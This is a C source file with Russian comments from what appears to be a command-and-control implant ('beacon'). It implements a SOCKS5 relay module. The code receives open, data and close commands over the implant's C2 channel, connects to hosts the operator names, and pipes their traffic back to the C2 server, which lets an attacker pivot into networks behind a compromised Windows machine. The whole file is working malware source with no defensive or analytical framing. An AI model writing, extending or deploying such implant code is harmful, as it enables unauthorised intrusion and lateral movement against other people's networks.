// cmd_socks.c — SOCKS5 relay over existing C2 channel
//
// Сервер открывает SOCKS5 TCP listener на своей стороне; клиент (proxychains и т.д.)
// подключается к нему. Трафик проходит через C2 HTTP/TCP/SMB канал бикона:
//
//   OP_SOCKS_OPEN  {conn_id u64, host utf8, port u32}
//       Биконе подключается к целевому хосту и сигнализирует об успехе/неудаче
//       через SOCKS_TASK_MAGIC выход.
//
//   OP_SOCKS_DATA  {conn_id u64, data bytes}
//       Биконе отправляет data на целевой сокет. Если есть немедленный ответ
//       или данные накопились — тоже отправляет их обратно.
//
//   OP_SOCKS_CLOSE {conn_id u64}
//       Закрывает соединение.
//
// Формат выходных кадров (task_id = SOCKS_TASK_MAGIC):
//   [u64 conn_id BE][u8 type][опциональный payload]
//   type 0x01 = CONNECT_OK
//   type 0x02 = CONNECT_FAIL
//   type 0x03 = DATA: [u32 len BE][bytes]
//   type 0x04 = CLOSE
//
// socks_flush_pending() вызывается из основного цикла и опрашивает все активные
// соединения на наличие поступивших данных от сервера (FIONREAD).

#include <winsock2.h>
#include <ws2tcpip.h>
#include "../core/beacon.h"

// ---- константы -----------------------------------------------------------

#define MAX_SOCKS_CONNS  16
#define SOCKS_BUF_SIZE   32768

#define SMSG_CONNECT_OK   0x01
#define SMSG_CONNECT_FAIL 0x02
#define SMSG_DATA         0x03
#define SMSG_CLOSE        0x04

// ---- таблица активных соединений -----------------------------------------

typedef struct {
    volatile LONG active;
    uint64_t      conn_id;
    SOCKET        sock;
} SocksConn;

static SocksConn g_socks[MAX_SOCKS_CONNS];
static LONG      g_socks_inited = 0;
static LONG      g_wsa_inited   = 0;

// ---- инициализация -------------------------------------------------------

static void socks_init(void) {
    if (InterlockedCompareExchange(&g_socks_inited, 1, 0) == 0) {
        for (int i = 0; i < MAX_SOCKS_CONNS; i++) {
            g_socks[i].active  = 0;
            g_socks[i].conn_id = 0;
            g_socks[i].sock    = INVALID_SOCKET;
        }
    }
    if (InterlockedCompareExchange(&g_wsa_inited, 1, 0) == 0) {
        WSADATA wsa;
        WSAStartup(MAKEWORD(2, 2), &wsa);
    }
}

// ---- вспомогательные функции ---------------------------------------------

// Поиск слота по conn_id.
static int socks_find(uint64_t conn_id) {
    for (int i = 0; i < MAX_SOCKS_CONNS; i++)
        if (g_socks[i].active && g_socks[i].conn_id == conn_id) return i;
    return -1;
}

// Резервирование нового слота с заданным conn_id.
static int socks_alloc(uint64_t conn_id) {
    for (int i = 0; i < MAX_SOCKS_CONNS; i++) {
        if (InterlockedCompareExchange(&g_socks[i].active, 1, 0) == 0) {
            g_socks[i].conn_id = conn_id;
            g_socks[i].sock    = INVALID_SOCKET;
            return i;
        }
    }
    return -1;
}

// Целое в строку без CRT.
static void u32_to_str(uint32_t v, char* out) {
    char tmp[12]; int n = 0;
    if (!v) { out[0] = '0'; out[1] = 0; return; }
    while (v) { tmp[n++] = (char)('0' + v % 10); v /= 10; }
    int i = 0;
    while (n) out[i++] = tmp[--n];
    out[i] = 0;
}

// Отправка SOCKS out-of-band сообщения через transport_direct_send.
static void socks_send(const TransportVtbl* t, uint64_t conn_id,
                       uint8_t type, const uint8_t* data, uint32_t dlen) {
    // Frame: [u64 conn_id BE][u8 type][для DATA: u32 len BE + data]
    uint32_t extra = (type == SMSG_DATA && data && dlen) ? (4u + dlen) : 0u;
    uint32_t total = 9u + extra;  // 8(conn_id) + 1(type) + extra
    uint8_t* buf = (uint8_t*)bmalloc(total);
    if (!buf) return;

    buf[0] = (uint8_t)(conn_id >> 56); buf[1] = (uint8_t)(conn_id >> 48);
    buf[2] = (uint8_t)(conn_id >> 40); buf[3] = (uint8_t)(conn_id >> 32);
    buf[4] = (uint8_t)(conn_id >> 24); buf[5] = (uint8_t)(conn_id >> 16);
    buf[6] = (uint8_t)(conn_id >>  8); buf[7] = (uint8_t)(conn_id);
    buf[8] = type;
    if (extra) {
        buf[9]  = (uint8_t)(dlen >> 24);
        buf[10] = (uint8_t)(dlen >> 16);
        buf[11] = (uint8_t)(dlen >>  8);
        buf[12] = (uint8_t)(dlen);
        rt_memcpy(buf + 13, data, dlen);
    }
    transport_direct_send(t, SOCKS_TASK_MAGIC, buf, total);
    bfree(buf);
}

// ---- Обработчики команд --------------------------------------------------

// OP_SOCKS_OPEN: подключиться к целевому host:port.
void cmd_socks_open(const BeaconTask* t) {
    socks_init();
    const TransportVtbl* tv = get_transport();

    uint64_t conn_id = 0;
    char     host[256] = {0};
    uint32_t port = 0;
    kv_get_u64(t->pay, t->pay_len, "conn_id", &conn_id);
    kv_get_str(t->pay, t->pay_len, "host",    host, sizeof(host));
    kv_get_u32(t->pay, t->pay_len, "port",    &port);

    if (!host[0] || !port) {
        socks_send(tv, conn_id, SMSG_CONNECT_FAIL, NULL, 0);
        return;
    }

    int slot = socks_alloc(conn_id);
    if (slot < 0) {
        socks_send(tv, conn_id, SMSG_CONNECT_FAIL, NULL, 0);
        return;
    }

    // Резолвинг и подключение.
    struct addrinfo hints, *res = NULL;
    rt_memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    char port_str[12];
    u32_to_str(port, port_str);

    if (getaddrinfo(host, port_str, &hints, &res) != 0 || !res) {
        InterlockedExchange(&g_socks[slot].active, 0);
        socks_send(tv, conn_id, SMSG_CONNECT_FAIL, NULL, 0);
        return;
    }

    SOCKET s = socket(res->ai_family, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) {
        freeaddrinfo(res);
        InterlockedExchange(&g_socks[slot].active, 0);
        socks_send(tv, conn_id, SMSG_CONNECT_FAIL, NULL, 0);
        return;
    }
    if (connect(s, res->ai_addr, (int)res->ai_addrlen) != 0) {
        freeaddrinfo(res);
        closesocket(s);
        InterlockedExchange(&g_socks[slot].active, 0);
        socks_send(tv, conn_id, SMSG_CONNECT_FAIL, NULL, 0);
        return;
    }
    freeaddrinfo(res);

    g_socks[slot].sock = s;
    socks_send(tv, conn_id, SMSG_CONNECT_OK, NULL, 0);
}

// OP_SOCKS_DATA: переслать данные на целевой сокет, вернуть ответ если есть.
void cmd_socks_data(const BeaconTask* t) {
    socks_init();
    const TransportVtbl* tv = get_transport();

    uint64_t conn_id = 0;
    kv_get_u64(t->pay, t->pay_len, "conn_id", &conn_id);
    const uint8_t* data = NULL; uint32_t dlen = 0;
    kv_find(t->pay, t->pay_len, "data", &data, &dlen);

    int slot = socks_find(conn_id);
    if (slot < 0) {
        socks_send(tv, conn_id, SMSG_CLOSE, NULL, 0);
        return;
    }
    SOCKET s = g_socks[slot].sock;
    if (s == INVALID_SOCKET) {
        InterlockedExchange(&g_socks[slot].active, 0);
        socks_send(tv, conn_id, SMSG_CLOSE, NULL, 0);
        return;
    }

    // Отправить данные на целевой хост.
    if (data && dlen) {
        int sent = 0;
        while (sent < (int)dlen) {
            int r = send(s, (const char*)data + sent, (int)(dlen - sent), 0);
            if (r <= 0) {
                closesocket(s);
                g_socks[slot].sock = INVALID_SOCKET;
                InterlockedExchange(&g_socks[slot].active, 0);
                socks_send(tv, conn_id, SMSG_CLOSE, NULL, 0);
                return;
            }
            sent += r;
        }
    }

    // Попытка прочитать немедленный ответ (если доступен).
    u_long avail = 0;
    if (ioctlsocket(s, FIONREAD, &avail) == 0 && avail > 0) {
        if (avail > SOCKS_BUF_SIZE) avail = SOCKS_BUF_SIZE;
        uint8_t* buf = (uint8_t*)bmalloc((size_t)avail);
        if (buf) {
            int n = recv(s, (char*)buf, (int)avail, 0);
            if (n > 0) {
                socks_send(tv, conn_id, SMSG_DATA, buf, (uint32_t)n);
            } else if (n == 0 || n == SOCKET_ERROR) {
                bfree(buf);
                closesocket(s);
                g_socks[slot].sock = INVALID_SOCKET;
                InterlockedExchange(&g_socks[slot].active, 0);
                socks_send(tv, conn_id, SMSG_CLOSE, NULL, 0);
                return;
            }
            bfree(buf);
        }
    }
}

// OP_SOCKS_CLOSE: закрыть соединение.
void cmd_socks_close(const BeaconTask* t) {
    socks_init();
    uint64_t conn_id = 0;
    kv_get_u64(t->pay, t->pay_len, "conn_id", &conn_id);
    int slot = socks_find(conn_id);
    if (slot >= 0) {
        if (g_socks[slot].sock != INVALID_SOCKET) {
            closesocket(g_socks[slot].sock);
            g_socks[slot].sock = INVALID_SOCKET;
        }
        InterlockedExchange(&g_socks[slot].active, 0);
    }
}

// ---- Периодический опрос активных соединений -----------------------------
// Вызывается из основного цикла бикона: проверяет наличие входящих данных
// от целевых хостов и отправляет их на сервер через SOCKS_TASK_MAGIC.
void socks_flush_pending(const TransportVtbl* t) {
    if (!g_socks_inited) return;
    for (int i = 0; i < MAX_SOCKS_CONNS; i++) {
        if (!g_socks[i].active) continue;
        SOCKET s = g_socks[i].sock;
        if (s == INVALID_SOCKET) continue;

        u_long avail = 0;
        if (ioctlsocket(s, FIONREAD, &avail) != 0) continue;
        if (avail == 0) continue;

        if (avail > SOCKS_BUF_SIZE) avail = SOCKS_BUF_SIZE;
        uint8_t* buf = (uint8_t*)bmalloc((size_t)avail);
        if (!buf) continue;

        int n = recv(s, (char*)buf, (int)avail, 0);
        if (n > 0) {
            socks_send(t, g_socks[i].conn_id, SMSG_DATA, buf, (uint32_t)n);
        } else {
            // Соединение закрыто удалённой стороной.
            bfree(buf);
            closesocket(s);
            g_socks[i].sock = INVALID_SOCKET;
            InterlockedExchange(&g_socks[i].active, 0);
            socks_send(t, g_socks[i].conn_id, SMSG_CLOSE, NULL, 0);
            continue;
        }
        bfree(buf);
    }
}
